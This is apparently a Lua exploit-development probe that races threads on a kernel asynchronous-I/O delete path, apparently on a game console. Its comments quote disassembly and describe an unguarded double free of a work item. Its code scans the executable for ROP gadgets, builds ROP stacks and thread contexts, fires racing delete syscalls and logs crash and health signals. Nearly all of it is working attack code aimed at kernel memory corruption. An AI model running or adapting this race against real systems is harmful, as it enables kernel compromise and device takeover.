-- CRASH_CLASS: HIGH
-- PROBE 727a: race an aio delete that must take path B
--
-- Context: every race measured so far (719a, 720a, 722a, 723a) used a
-- non-block create, so the entry count [T+2] was 1 and the delete took the
-- count==1 path A at 8ad6feae. Path A stops the loser with the context guard:
--   8ad6feb7 mov r14,[r12+0x18]      ; C
--   8ad6fec3 test r14,r14 / je       ; already cleared -> status-only exit
--   8ad6fef5 mov qword [r12+0x18],0  ; the clear that saves it
--
-- A BLOCK create (flags 0x1001) sets [T]=[T+2]=count, so every delete takes
-- path B at 8ad6ffbc, which has no such guard at all:
--   8ad6ffc4 test r12,r12 / je       ; only "slot still present"
--   8ad6ffcd dec r8d / mov [rax+2],r8w
--   8ad6ffe1 call 0x8b5b1760         ; destroy the item's event
--   8ad6fff2 call 0x8ad73e90         ; free(W)  <-- unconditional
--   8ad70003 mov qword [rcx+rdx*8],0 ; clear the slot, AFTER the free
--
-- So the winner cannot clear the slot until it has finished two calls, and a
-- loser that captured r12 before that free runs on its own copy of the work
-- item: two frees of the same 0x58 chunk, plus a double event destroy.
--
-- This probe races N children on ONE id of a block create, then walks the rest
-- of the block and runs health cycles. A clean walk is not a refutation (14.10
-- writes 0 on the miss path too); a panic, a non-zero status or a health
-- anomaly is the signal.

print("=== PROBE 727a: block-mode aio delete race (path B) ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}
    for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n
    setmetatable(t,getmetatable(syscall.pipe))
    return t
end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end end
local function rq(a) local o,v=pcall(function() return memory.read_qword(a) end); if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end

local fn_ud = syscall.pipe.fn_addr
local fn = to_num(fn_ud)
print("[A] pid=" .. tostring(to_num(native.fcall_with_rax(fn_ud, 20))))

local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() mk(593)(uint64(0), uint64(info)) end)
local ebase = (rd(info+0x10C) or 0)*4294967296 + (rd(info+0x108) or 0)
local function find_pat(base, limit, pat)
    local chunk, off = 0x1000, 0
    while off < limit do
        local want = limit - off
        if want > chunk then want = chunk end
        local ok, s = pcall(function() return memory.read_buffer(base+off, want) end)
        if not ok or type(s) ~= "string" then return nil end
        local i = string.find(s, pat, 1, true)
        if i then return base + off + i - 1 end
        off = off + want
    end
    return nil
end
local pop_rax = find_pat(ebase, 0x494000, string.char(0x58,0xC3))
local pop_rdi = find_pat(ebase, 0x494000, string.char(0x5F,0xC3))
local pop_rsi = find_pat(ebase, 0x494000, string.char(0x5E,0xC3))
local pop_rdx = find_pat(ebase, 0x494000, string.char(0x5A,0xC3))
local jmp_g   = find_pat(ebase, 0x494000, string.char(0xEB,0xFE))
if not (pop_rax and pop_rdi and pop_rsi and pop_rdx and jmp_g) then print("[A] gadgets missing") return end
print(string.format("[A] eboot=%X poprax=%X poprdi=%X poprsi=%X poprdx=%X jmp$=%X",
    ebase, pop_rax, pop_rdi, pop_rsi, pop_rdx, jmp_g))

local sc_mmap = mk(477)
local page = 0x4000
local function mmap(px)
    local _, a = pcall(function() return sc_mmap(uint64(0), uint64(px), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)) end)
    local v = to_num(a)
    if v ~= 0 then zero(v, px) end
    return v
end

local Ctx = {MAGIC=0x108, TYPE=0x110, CS=0x0C0, RIP=0x0E0, RSP=0x0F8, SS=0x100,
             RDI=0x048, RSI=0x050, RDX=0x058, RAX=0x078}
local W = mmap(page)

local function spawn(idpage, stat)
    local stack = mmap(page*4)
    local base = stack + page*4 - 0x200
    wq(base,    uint64(pop_rdi)); wq(base+8,  uint64(idpage))
    wq(base+16, uint64(pop_rsi)); wq(base+24, uint64(1))
    wq(base+32, uint64(pop_rdx)); wq(base+40, uint64(stat))
    wq(base+48, uint64(pop_rax)); wq(base+56, uint64(662))
    wq(base+64, uint64(fn))
    wq(base+72, uint64(pop_rax)); wq(base+80, uint64(431))
    wq(base+88, uint64(fn));      wq(base+96, uint64(jmp_g))
    local ctx = memory.alloc(0x500)
    zero(ctx, 0x500)
    wq(ctx+Ctx.MAGIC, uint64(0x480)); wq(ctx+Ctx.TYPE, uint64(0x10000))
    wq(ctx+Ctx.CS, uint64(0x43));     wq(ctx+Ctx.SS, uint64(0x3B))
    wq(ctx+Ctx.RIP, uint64(fn));      wq(ctx+Ctx.RSP, uint64(base))
    wq(ctx+Ctx.RDI, uint64(W));       wq(ctx+Ctx.RSI, uint64(2))
    wq(ctx+Ctx.RDX, uint64(0));       wq(ctx+Ctx.RAX, uint64(454))
    local tb = memory.alloc(8)
    wq(tb, uint64(0))
    local ok, rv = pcall(function() return mk(430)(uint64(ctx), uint64(tb), uint64(0)) end)
    return ok and to_num(rv) == 0, rd(tb) or 0
end

local ts = memory.alloc(16)
local function sleep_ms(ms) wq(ts,0); wq(ts+8, ms*1000000); pcall(function() mk(240)(uint64(ts), uint64(0)) end) end

local data = mmap(page)
local pout = mmap(page)

local COUNT = 8
local KIDS  = 8
local ROUNDS = 10

local both, one, miss, anomalies, walked = 0, 0, 0, 0, 0

for r=1,ROUNDS do
    local o = mmap(page)
    local okc, rvc = pcall(function() return mk(669)(uint64(0x1001), uint64(data), uint64(COUNT), uint64(1), uint64(o)) end)
    if not (okc and to_num(rvc) == 0) then
        print(string.format("    round %d block create failed rv=%s", r, tostring(to_num(rvc))))
    else
        local base = rd(o) or 0
        -- ids array, one page of dwords
        local ids = mmap(page)
        for i=0,COUNT-1 do wd(ids + i*4, base + i*0x10000) end
        local polls = mmap(page)
        pcall(function() mk(664)(uint64(ids), uint64(COUNT), uint64(polls)) end)
        local all3 = true
        for i=0,COUNT-1 do
            if (rd(polls + i*4) or 0) ~= 3 then all3 = false end
        end
        print(string.format("[B] round %d base=%08X polls-all-3=%s", r, base, tostring(all3)))

        -- race ONE id of the block
        local idpage = mmap(page)
        wd(idpage, base)
        wd(W, 0)
        local stats, spawned = {}, 0
        for k=1,KIDS do
            stats[k] = mmap(page)
            wd(stats[k], 0x77777777)
            local ok = spawn(idpage, stats[k])
            if ok then spawned = spawned + 1 end
        end
        sleep_ms(15)
        for i=1,KIDS*2 do pcall(function() mk(454)(uint64(W), uint64(3), uint64(2), uint64(0), uint64(0)) end) end
        sleep_ms(25)
        local zeros, other = 0, {}
        for k=1,KIDS do
            local v = rd(stats[k]) or 0
            if v == 0 then zeros = zeros + 1 else other[#other+1] = string.format("%08X", v) end
        end
        if zeros >= 2 then both = both + 1
        elseif zeros == 1 then one = one + 1
        else miss = miss + 1 end
        print(string.format("[C] round %d spawned=%d zeros=%d other=[%s]", r, spawned, zeros,
            table.concat(other, " ")))

        -- walk the surviving items: poll, then delete each
        local ids2 = mmap(page)
        for i=1,COUNT-1 do wd(ids2 + (i-1)*4, base + i*0x10000) end
        local polls2 = mmap(page)
        local okp, rvp = pcall(function() return mk(664)(uint64(ids2), uint64(COUNT-1), uint64(polls2)) end)
        local pstr = {}
        for i=0,COUNT-2 do pstr[#pstr+1] = string.format("%08X", rd(polls2 + i*4) or 0) end
        local delst = mmap(page)
        local okd, rvd = pcall(function() return mk(662)(uint64(ids2), uint64(COUNT-1), uint64(delst)) end)
        local dstr = {}
        for i=0,COUNT-2 do dstr[#dstr+1] = string.format("%08X", rd(delst + i*4) or 0) end
        print(string.format("[D] round %d walk poll=[%s] del=[%s] rv=%s/%s", r,
            table.concat(pstr," "), table.concat(dstr," "), tostring(to_num(rvp)), tostring(to_num(rvd))))

        local clean = true
        for i=0,COUNT-2 do
            local s = rd(delst + i*4) or 0
            if s ~= 0 and s ~= 0x80020003 then clean = false end
        end
        if clean then walked = walked + 1 end
    end

    -- health: a fresh object must still allocate, poll and delete cleanly
    local ho = mmap(page)
    local hp = mmap(page)
    local hs = mmap(page)
    local ok1, rv1 = pcall(function() return mk(669)(uint64(0x1), uint64(data), uint64(1), uint64(1), uint64(ho)) end)
    local ok2, rv2 = pcall(function() return mk(664)(uint64(ho), uint64(1), uint64(hp)) end)
    wd(hs, 0x77777777)
    local ok3, rv3 = pcall(function() return mk(662)(uint64(ho), uint64(1), uint64(hs)) end)
    local hstate = rd(hp) or 0
    local hstatus = rd(hs) or 0
    if not (ok1 and ok2 and ok3 and to_num(rv1)==0 and to_num(rv2)==0 and to_num(rv3)==0 and hstate==3 and hstatus==0) then
        anomalies = anomalies + 1
        print(string.format("    round %d HEALTH ANOMALY rv=%s/%s/%s state=%08X status=%08X",
            r, tostring(to_num(rv1)), tostring(to_num(rv2)), tostring(to_num(rv3)), hstate, hstatus))
    end
end

print(string.format("[E] both=%d one=%d miss=%d walk-clean=%d/%d health-anomalies=%d alive=%d",
    both, one, miss, walked, ROUNDS, anomalies, to_num(native.fcall_with_rax(fn_ud, 20))))
